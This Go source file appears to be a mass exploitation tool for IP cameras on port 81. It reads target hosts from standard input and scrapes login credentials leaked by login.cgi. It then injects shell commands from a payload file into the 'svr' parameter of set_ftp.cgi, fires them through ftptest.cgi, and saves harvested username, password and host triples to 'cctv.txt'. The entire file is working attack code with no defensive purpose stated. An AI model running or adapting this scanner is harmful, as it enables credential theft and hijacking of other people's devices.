package main

import (
	"fmt"
	"net"

	//    "io/ioutil"
	"bufio"
	"errors"
	"os"
	"strings"
	"sync"
	"time"
)

//urmom

var group sync.WaitGroup
var port int = 81
var failed int
var found int
var total int
var sent int

func retrieve_credentials(host string) (string, string, error) {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), time.Duration(10)*time.Second)
	if err != nil {
		return "", "", err
	}
	defer conn.Close()
	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	_, err = conn.Write([]byte("GET login.cgi HTTP/1.1\r\n\r\n"))
	if err != nil {
		return "", "", err
	}
	buf := make([]byte, 1024)
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	for {
		_, err = conn.Read(buf)
		if err != nil {
			break
		}
	}
	if !strings.Contains(string(buf), "var login") {
		return "", "", errors.New(fmt.Sprintf("Failed to determine if host is vulnerable - %s", host))
	}
	// Parse the credentials
	ind := strings.Index(string(buf), "var login")
	done := buf[ind:]
	done2 := strings.Trim(string(done), "\r\n")
	split := strings.Split(done2, " ")
	if len(split) <= 1 {
		return "", "", errors.New(fmt.Sprintf("Failed to split the credentials\n"))
	}
	preuser := split[1]
	prepass := split[2]
	preuser = strings.Trim(preuser, "var \r\n")
	prepass = strings.Trim(prepass, "var \r\n")
	if len(preuser) > 11 && len(prepass) > 11 {
		username := preuser[11:]
		password := prepass[11:]
		username = strings.Trim(username, "\";")
		password = strings.Trim(password, "\";")
		return username, password, nil
	}
	return "", "", errors.New("Error getting credentials")
}

func submit_payload(host string, payload string) bool {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), time.Duration(10)*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(30 * time.Second))
	_, err = conn.Write([]byte(fmt.Sprintf("%s", payload)))
	if err != nil {
		return false
	}
	return true
}

func submit_payload_wait(host string, payload string) bool {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), time.Duration(10)*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(60 * time.Second))
	_, err = conn.Write([]byte(fmt.Sprintf("%s", payload)))
	if err != nil {
		return false
	}
	buf := make([]byte, 1024)
	for {
		_, err := conn.Read(buf)
		if err != nil {
			break
		}
		if len(buf) > 1 {
			if strings.Contains(string(buf), "ok") {
				return true
			}
		}
	}
	return false
}

func run(host string) {
	username, password, err := retrieve_credentials(host)
	if err != nil {
		failed++
		group.Done()
		return
	}
	f, err := os.Open("payload_file")
	if err != nil {
		group.Done()
		return
	}
	defer f.Close()
	r := bufio.NewReader(f)
	scan := bufio.NewScanner(r)
	found++
	for scan.Scan() {
		ret := submit_payload(host, "GET /set_ftp.cgi?loginuse="+username+"&loginpas="+password+"&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28"+scan.Text()+"%29 HTTP/1.1\n\n")
		if !ret {
			failed++
			goto end
		}
		sent++
		ret2 := submit_payload_wait(host, "GET /ftptest.cgi?loginuse="+username+"&loginpas="+password+" HTTP/1.1\n\n")
		if !ret2 {
			failed++
			goto end
		}
		time.Sleep(1 * time.Second)
	}
end:
	f, Error := os.OpenFile("cctv.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	if Error != nil {
		return
	}
	defer f.Close()
	fmt.Printf("\033[37m%s\033[31m:\033[37m%s\033[91m:\033[37m%s\n", username, password, host)
	s := fmt.Sprintf("%s:%s:%s\n", username, password, host)
	_, err = f.WriteString(s)
	if err != nil {
		panic(err)
	}
	group.Done()
	return
}

func main() {
	var seconds int
	fmt.Printf("[urmommy] Listening on port :%d\n", port)
	go func() {
		for {
			time.Sleep(1 * time.Second)
			fmt.Printf("\033[31m[\033[37m%d's\033[31m] - \033[37mTotal\033[31m:\033[37m %d \033[31m- \033[37mBruted\033[31m:\033[37m %d \033[31m- \033[37mSent\033[31m:\033[37m %d \033[31m- \033[37mFailed\033[31m:\033[37m %d\n", seconds, total, found, sent, failed)
			seconds++
		}
	}()
	for {
		r := bufio.NewReader(os.Stdin)
		scan := bufio.NewScanner(r)
		for scan.Scan() {
			total++
			go run(scan.Text())
			group.Add(1)
		}
	}
	for {
		time.Sleep(1 * time.Second)
	}
}
